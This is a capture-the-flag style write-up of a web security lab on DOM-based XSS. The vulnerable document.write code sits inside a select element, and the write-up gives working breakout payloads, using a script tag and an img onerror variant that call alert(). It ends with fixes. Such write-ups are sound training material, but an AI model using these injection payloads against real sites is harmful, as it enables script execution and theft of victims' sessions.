# Lab: DOM XSS in document.write sink using source location.search inside a select element

**Category:** Cross-Site Scripting (XSS)\
**Difficulty:** Practitioner\
**Objective:** Break out of the select element and call the `alert()` function.

## 0. Attacker mindset

DOM-based XSS can occur when user-controlled data flows from `location.search` into `document.write()`. The context matters enormously. Even if the data is written inside a harmless-looking `<select>` element, an attacker can **close the select tag** and inject completely new HTML elements. The key is understanding how to properly exit the current context without breaking the overall page structure.

## 1. What is the vulnerability?

The product page includes a stock checker form. Inside it, JavaScript dynamically creates a `<select>` dropdown using `document.write()`:

```javascript
<form id="stockCheckForm" action="/product/stock" method="POST">
    <input required type="hidden" name="productId" value="1">
    <script>
        var stores = ["London","Paris","Milan"];
        var store = (new URLSearchParams(window.location.search)).get('storeId');
        document.write('<select name="storeId">');
        if(store) {
            document.write('<option selected>'+store+'</option>');
        }
        for(var i=0;i<stores.length;i++) {
            if(stores[i] === store) {
                continue;
            }
            document.write('<option>'+stores[i]+'</option>');
        }
        document.write('</select>');
    </script>
    <button type="submit" class="button">Check stock</button>
</form>
```

**The vulnerability:**
- The `storeId` parameter from the URL is read via `location.search`
- It's concatenated directly into `document.write()` without any sanitization
- The data is written inside a `<select>` element, but we can break out

## 2. How did I exploit it?

### Code Analysis

The vulnerable code writes user input directly into an `<option>` tag inside a `<select>`:

```javascript
if(store) {
    document.write('<option selected>'+store+'</option>');
}
```

The key observation: `document.write()` writes raw HTML. If our payload contains HTML tags, they will be interpreted as HTML, not text.

We can:
1. **Close the `<option>` tag** with `</option>`
2. **Close the `<select>` tag** with `</select>`
3. **Inject our own HTML** (e.g., `<script>alert(1)</script>`)
4. **Re-open `<select>` and `<option>`** to maintain page structure (optional but clean)

### The Payload
**Final payload:**
```html
</option></select><script>alert(1)</script><select><option>
```

**Simplified version (also works):**
```html
</option></select><script>alert(1)</script>
```

**Step-by-step execution:**

| Payload part | Action |
|--------------|--------|
| `</option>` | Closes the existing `<option selected>` tag |
| `</select>` | Closes the existing `<select>` tag |
| `<script>alert(1)</script>` | Injects and executes JavaScript |
| `<select><option>` | Creates new select element to absorb remaining options (prevents broken HTML) |

### Burp Suite's Solution

```html
"></select><img src=1 onerror=alert(1)>
```

## 3. Impact

- Arbitrary JavaScript execution when the page loads (no user interaction)
- DOM-based - the payload never touches the server, bypassing many WAFs
- Can steal cookies, session tokens, or perform actions as the victim

## 4. How can it be fixed?

- **Never use `document.write()` with untrusted data** - it's a dangerous sink
- Use safe DOM manipulation methods like `createElement()` and `textContent`
- Encode HTML special characters before inserting into the page
- Use `encodeURIComponent()` for URL parameters, but that's not enough for HTML injection
- Implement a Content Security Policy (CSP) to restrict script execution

---

**MITRE ATT&CK:** [T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)